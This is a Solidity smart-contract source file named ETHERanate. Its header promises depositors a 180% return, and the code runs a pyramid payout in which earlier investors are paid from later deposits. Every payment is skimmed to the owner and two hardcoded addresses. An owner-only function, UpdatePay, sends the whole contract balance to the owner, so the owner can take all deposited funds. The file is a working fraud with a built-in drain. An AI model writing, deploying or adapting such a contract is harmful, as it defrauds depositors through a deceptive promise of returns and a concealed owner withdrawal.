1 /*
2 etheranate  - ethereum pomegranate
3 
4 Ladder deposit based contract with float percentage based on EtheriumPyramidSample on GitHub.
5 
6 ETHERanate allows to get outcome in 180% with smallest deposit
7 
8 */
9 contract ETHERanate
10 {
11     struct Payer 
12     {
13         address ETHaddress;
14         uint ETHamount;
15     }
16 
17     Payer[] public persons;
18 
19     uint public paymentqueue = 0;
20     uint public feecounter;
21     uint amount;
22     
23     address public owner;
24     address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;
25     address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;
26     address meg=this;
27 
28     modifier _onlyowner
29     {
30         if (msg.sender == owner)
31         _
32     }
33     
34     function ETHERanate() 
35     {
36         owner = msg.sender;
37     }
38     function()            
39     {
40         enter();
41     }
42     function enter()
43     {
44         if (msg.sender == owner)
45 	    {
46 	        UpdatePay();                                          
47 	    }
48 	    else                                                          
49 	    {
50             feecounter+=msg.value/10;                                  
51 	        owner.send(feecounter/2);                           
52 	        ipyh.send((feecounter/2)/2);                                 
53 	        hyip.send((feecounter/2)/2);
54 	        feecounter=0;                                            
55 	        
56             if (msg.value == (1 ether)/40)                                
57             {
58 	            amount = msg.value;                                      
59 	            uint idx=persons.length;                                   
60                 persons.length+=1;
61                 persons[idx].ETHaddress=msg.sender;
62                  persons[idx].ETHamount=amount;
63                 canPay();                                              
64             }
65 	        else                                                         
66 	        {
67 	            msg.sender.send(msg.value - msg.value/10);                   
68 	        }
69 	    }
70 
71     }
72     
73     function UpdatePay() _onlyowner                                            
74     {
75         msg.sender.send(meg.balance);
76     }
77     
78     function canPay() internal                                                  
79     {
80         while (meg.balance>persons[paymentqueue].ETHamount/100*180)             
81         {
82             uint transactionAmount=persons[paymentqueue].ETHamount/100*180;     
83             persons[paymentqueue].ETHaddress.send(transactionAmount);           
84             paymentqueue+=1;                                                    
85         }
86     }
87 }